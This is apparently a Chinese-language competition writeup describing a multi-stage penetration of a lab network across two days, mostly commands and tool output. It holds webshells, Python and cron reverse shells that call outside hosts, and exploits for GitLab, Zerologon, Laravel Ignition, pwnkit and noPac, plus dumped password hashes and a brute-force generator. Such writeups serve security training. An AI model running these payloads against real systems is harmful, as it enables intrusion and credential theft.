---
title: 2023 贵阳大数据网络安全精英对抗赛 SU Writeup
tags: ["渗透"]
date: 2023-08-24 13:51:39
slug: "gyb-2023-su-wu"
---

本次比赛分为2天渗透，比赛时间为5月17日和5月18日，我们取得了 4th 的好成绩，因为很多是赛后复现加上渗透比赛没啥附件，所以有一些内容会有一些差异。

<!--more-->

## 2023 05 17 day1


## 1、DMZ区
### 入口1：172.30.38.150:80 bluecms
bluecms后台：http://172.30.38.150/admin/
账号密码 admin admin666
后台系统管理->模板管理处获编译htm文件，修改为php，burp包如下
```
POST /admin/tpl_manage.php HTTP/1.1
Host: 172.30.38.150
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Origin: http://172.30.38.150
Connection: close
Referer: http://172.30.38.150/admin/tpl_manage.php?act=edit&tpl_name=search.htm
Cookie: PHPSESSID=rkiacm3stpb4c9vpj0cp8cfo67
Upgrade-Insecure-Requests: 1

tpl_content=%3C%3Fphp+echo+123%3B%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%3F%3E&tpl_name=../shell.php&act=do_edit
```
获取权限，蚁剑连接，根目录下有flag.txt
```
flag{9130db0c-c67b-4cee-a9a1-a79c34efc079}
```
同时找/var/www/html/data/config.php看到了关于数据库账号密码相关信息
```
$dbhost   = "127.0.0.1"; //dmz-db
$dbname   = "bluecms";
$dbuser   = "root";
$dbpass   = "root"; // root-gzdb123
```
但是这里的数据库是本地的，我们第二个靶标与该ip并不是一个，但是既然给了hint，猜测是同一个密码

### 入口2：172.30.38.151:3306 
根据入口1获取的数据库的密码，连接上了数据库，但是数据库中没有数据，尝试提权，试了几种发现udf可以，在国光师傅的博客 https://sqlsec.com/udf/
上复制dll的exp下来，然后执行命令获取权限，整体过程如下
hex太大 这里缩写为0x4d5a900003....
```

MySQL [(none)]> select @@plugin_dir;
+----------------------------------------------------+
| @@plugin_dir                                       |
+----------------------------------------------------+
| C:\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin\ |
+----------------------------------------------------+
1 row in set (0.003 sec)

MySQL [(none)]> SELECT 0x4d5a900003 INTO DUMPFILE 'C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\\plugin\\udf.dll';
MySQL [(none)]> create function sys_eval returns string soname 'udf.dll';
MySQL [(none)]> select sys_eval("whoami");
+---------------------+
| sys_eval("whoami")  |
+---------------------+
| nt authority\system |
+---------------------+
1 row in set (0.042 sec)
然后一步步翻flag
MySQL [(none)]> select sys_eval('type C:\\users\\Administrator\\Desktop\\flag.txt');
+--------------------------------------------------------------+
| sys_eval('type C:\\users\\Administrator\\Desktop\\flag.txt') |
+--------------------------------------------------------------+
| flag{522a6ec2-b101-4bae-b2fd-3e0582096a37                    |
+--------------------------------------------------------------+
1 row in set (0.030 sec)
```

## 2、内网区
DMZ区拿下了一台linux 一台windows ，选择用linux挂代理
```
linux:
./gost -L=socks5://:7777
./gost -L rtcp://0.0.0.0:8888/localhost:7777 -F forward+ssh://admin:123456@172.30.38.201:9898?ping=30

本地：
gost-windows-amd64.exe -L forward+ssh://admin:123456@:9898
本地的8888就是内网区的代理了
```
### 内网区gitlab:192.168.20.19:8080
先fscan扫描
`./fscan -h 192.168.0.0/16`
网络有点卡，等了一会发现除了DMZ区外只有一个内网服务器
```
192.168.20.19:8080 open
192.168.20.19:22 open
[*] WebTitle:http://192.168.20.19:8080 code:302 len:105    title:None
[*] WebTitle:http://192.168.20.19:8080/users/sign_in code:200 len:17     title:Sign in · GitLab
[+] InfoScan:http://192.168.20.19:8080/users/sign_in [GitLab] 
[+] http://192.168.20.19:8080 poc-yaml-gitlab-cnvd-2021-14193-infoleak
```
网站找gitlab前台rce漏洞，分析了一下，cve-2021-22205可用，github找一个exp打，这里很蛋疼，这个poc是无回显的，而且gitlab不太方便做权限维持（不是php写的），尝试反弹shell，但是内网区是不通本地的ip，只有DMZ区通。
所以我使用的方法是
```
1、先将dmz区的linux反弹shell到本地获取一个交互式dmz区的shell
这个dmz区反弹一直报错，最后使用python3反弹的
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.10",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
2、在交互式dmz区的shell上 监听nc -lnvp 9090
3、用gitlab的exp 反弹shell到dmz的ip（192.168.10.10）
```

获取了git的权限，flag在根目录 
```
git@60783d084846:~/gitlab$ cat /flag.txt
flag{b10785ca-a4ff-4cb9-a6d5-50351c248ee3}
```
### 内网区windows:192.168.20.15
fscan开多了，所以没扫到其他资产，试了很久。然后把fscan进程一个个杀了，降低线程+重新跑了一下20+取消ping。
发现了另外一个资产
```python
192.168.20.19:22 open
192.168.20.15:135 open
192.168.20.15:139 open
192.168.20.15:445 open
192.168.20.19:8080 open
192.168.20.15:88 open
NetInfo:
[*]192.168.20.15
   [->]DC
   [->]192.168.20.15
[*] 192.168.20.15  (Windows Server 2012 R2 Datacenter 9600)
[*] 192.168.20.15  [+]DC COMPANY\DC                Windows Server 2012 R2 Datacenter 9600
[*] WebTitle:http://192.168.20.19:8080 code:302 len:105    title:None
[*] WebTitle:http://192.168.20.19:8080/users/sign_in code:200 len:17     title:Sign in · GitLab
[+] InfoScan:http://192.168.20.19:8080/users/sign_in [GitLab] 
[+] http://192.168.20.19:8080 poc-yaml-gitlab-cnvd-2021-14193-infoleak

```
192.168.20.15是一台裸DC
发现存在Zerologon经典漏洞，CVE-2020-1472
先挂上192.168.10.10上的代理，github找一个exp,对着网站复现。
拿到hash用kali的impacket组件，然后用wmiexec命令执行获取flag,所有过程如下
```
proxychains4 python3 cve-2020-1472-exploit.py DC 192.168.20.15                                 1 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Performing authentication attempts...
[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:135  ...  OK
[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:49158  ...  OK
==================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!

─$ proxychains4 python3 secretsdump.py  -hashes :31d6cfe0d16ae931b73c59d7e0c089c0  "company.local/DC\$@192.168.20.15"  2 ⨯
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.10.1.dev1 - Copyright 2022 Fortra

[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:445  ...  OK
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:135  ...  OK
[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:49155  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c1cd39bfd103a65a50fe6c7199dab799:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:51103e514e91e837821f6c70b2fcbf3a:::
DC$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:245e5824adfc248572451cb966eb44fea409149e70713f0b8400069732580b47
krbtgt:aes128-cts-hmac-sha1-96:21fba0c76db699fb80c59730a1bb467c
krbtgt:des-cbc-md5:dace764645ea2646
DC$:aes256-cts-hmac-sha1-96:34c8b93f22c8c95d6c07a1a2bf35dcfae048091233406be6e16f89cdc1865db8
DC$:aes128-cts-hmac-sha1-96:4c0c9af9f667ba964235c2d27b99e3c3
DC$:des-cbc-md5:43d519a4f22ca2a7
[*] Cleaning up... 

└─$ proxychains4 python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c1cd39bfd103a65a50fe6c7199dab799 company.local/Administrator@192.168.20.15
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
Impacket v0.10.1.dev1 - Copyright 2022 Fortra

[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:445  ...  OK
[*] SMBv3.0 dialect used
[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:135  ...  OK
[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:49154  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>type C:\Users\Administrator\Desktop\flag.txt
flag{bcbdb15f-fad8-4f18-b9d5-c5ff397bf275}

```

## 3、核心内网区
总结前面的信息，在内网区的gitlab上跑fscan，获取扫描核心内网的资产
```
git@60783d084846:/tmp/fscan$ ./f -np -h 192.168.30.0/24 -o 30.txt
./f -np -h 192.168.30.0/24 -o 30.txt

   ___                              _    
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.6.3
start infoscan
192.168.30.19:21 open
192.168.30.13:80 open
192.168.30.13:22 open
192.168.30.19:22 open

alive ports len is: 4
start vulscan
[*] WebTitle:http://192.168.30.13      code:200 len:7      title:Laravel
[+] InfoScan:http://192.168.30.13      [Laravel] 
已完成 1/4 [-] ssh 192.168.30.19:22 root root@2019 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
已完成 3/4 [-] ftp://192.168.30.19:21 www Passw0rd 530 Login incorrect.
```
开了一个web服务器192.168.30.13 是laravel
一个ftp 192.168.30.19是一个ftp。
### 搭建核心区代理
因为每一层都是单通道，这里尝试把核心区代理到本地，方便对laravel进行渗透，其实这里只要把第二层内网区的网络代理到本地就可以到第三层
搭建代理逻辑如下
1、在第一层DMZ区的192.168.10.10上搭建一个服务器端
```shell
./gost -L forward+ssh://admin:123456@:17979
```
2、在第二层内网区服务器上起动客户端，让第二层的网络环境到达第一层。
```shell
./gost -L=socks5://:7777
./gost -L rtcp://0.0.0.0:7979/localhost:7777 -F forward+ssh://admin:123456@192.168.10.10:17979?ping=30
```
此时在192.168.10.10上执行curl -x socks5://localhost:17979 192.168.30.13 访问正常即可。
结合第一层的代理，然后两层代理一起使用代理链的功能，本地就直接通30了，配置如下
```shell
127.0.0.1:8888
localhost:7979
```
本地规则为 192.168.30.0/24 走proxychains
### Laravel : 192.168.30.13
laravel经典漏洞 `/_ignition/execute-solution debug rce CVE-2021-3129`
这个靶场的这个题是今年网鼎决赛-渗透赛道的原题，本人刚好参加并且网鼎决赛现场做出。
，思路为`任意文件读获取log位置，debug打反序列化rce`
任意文件读的接口如下 /api/file
```
一步步读框架文件，读到配置文件
http://192.168.30.13/api/file?filename=/var/www/html/laravel/config/logging.php
找到日志文件位置logs/tmplog/laravel_log.log
```
直接用网的exp，注意就是把log位置都改一下
例如
```shell
POST /_ignition/execute-solution HTTP/1.1
Host: 192.168.30.13
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Type: application/json
Content-Length: 326

{
 "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
 "parameters": {
  "variableName": "username",
  "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/tmplog/laravel_log.log"
 }
}
```
在/var/www/html/laravel/public/写一个木马后可以访问，发现home目录下有flag和hint
```shell
(www-data:/home) $ cat flag.txt
flag{6855969e-7557-4bf4-9c8c-f5f80ee8e666}
(www-data:/home) $ cat .hint.txt
hint: 
FTP:
ftpuser
SecretData_xxxx!@#
xxxx is four-digit!
```
这个hint就是下一步用的
### FTP : 192.168.30.19
根据上面的提示 ftp密码是SecretData_xxxx!@#，
写一个脚本生成
```py
#python exp.py > passwd.txt
password=""
for i in range(0,10):
    for j in range(0,10):
        for m in range(0,10):
            for z in range(0,10):
                print('SecretData_' + str(i)+ str(j)+ str(m)+ str(m) + "!@#")
```

用超级弱口令导入用户名ftpuser，密码passwd.txt爆破
```
192.168.30.19----FTP----21----ftpuser----SecretData_7689!@#
```
连接发现有个报错`500 Illegal PORT command.
425 Use PORT or PASV first.`
网上找了一下为啥，尝试`quote PASV` 改成被动模式，用windows的资源管理器打开发现可以复制出来了
获取到flag
```
flag{5923d77e-0765-4701-bc2d-fc1188fe953b}
```


# 2023 05 18 day2

## DMZ区

### Tomcat-RCE

```
弱口令

admin:admin123!@#,有可能记错
```
```jsp	
<FORM METHOD=GET ACTION='evil.jsp'>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
    <%
       String cmd = request.getParameter("cmd");
       String output = "";
       if(cmd != null) {
          String s = null;
          try {
             Process p = Runtime.getRuntime().exec(cmd,null,null);
             BufferedReader sI = new BufferedReader(new
    InputStreamReader(p.getInputStream()));
             while((s = sI.readLine()) != null) { output += s+"</br>"; }
          }  catch(IOException e) {   e.printStackTrace();   }
       }
    %>
    <pre><%=output %></pre>
```

```shell
jar -cvf ../webshell.war * # 生成war包上传
```

```shell
user1:asd123 #ssh口令
# 登陆上去为user1用户需要提权，用户目录下应该有一个poc.c文件，pwnkit提权:CVE-2021-4034
gcc poc.c -o poc, ./poc
```

## 内网

### docker容器

```shell
# tomcat进去应该能翻到一个ssh口令
root:deploy-20231212

#端口:10022
用这个口令去连内网中存在这个端口的服务器，上去是docker容器

## 特权容器逃逸操作
fdisk -l # 查看磁盘文件
mkdir /tmp/data #新建临时文件
mount /dev/vda1 /tmp/data # 挂着宿主机目录
echo '* * * * * bash -i >& /dev/tcp/192.168.3.2/8888 0>&1' >> /tmp/data/var/spool/cron/crontabs/root # 写入定时文件反弹shell

## 逃逸成功后，在宿主机上查看另外一个容器,可以发现一个数据库密码
sa:_H66rCce2psF4D5E8v2B6x3:master
```



### SqlServerRCE

```shell
sa:_H66rCce2psF4D5E8v2B6x3:master # 用户名:密码:数据库
```

```shell
# kali中 安装impacket的包, 里面有这个模块
impacket-mssqlclient -db master sa:_H66rCce2psF4D5E8v2B6x3@192.168.153.147 #链接远程数据库

## 按照工具提示，启动一下xp_cmdshell,就可以执行命令了
```



## 核心内网

### NoPAC-RCE

```shell
# 在sqlserver服务器中翻到的账户密码，直接用nopac来打，直接获得一个shell
python3 ./noPac.py lab.local/test:'1qaz@WSX' -dc-ip 192.168.153.148 -use-ldap -shell --impersonate administrator
```



### hash

```shell
# 打完NoPAC-RCE后, 可以翻到一个密码提示文件
# 最终密码为: user:LAB2022!@#_summer
# 在终端中输入注意用'\'来转义一下'!', 返回到hash就能其中一个就是flag, 会有flag字样提示的
cme smb 192.168.153.149 -u "user" -p "LAB2022\!@#_summer" -M lsassy 
```

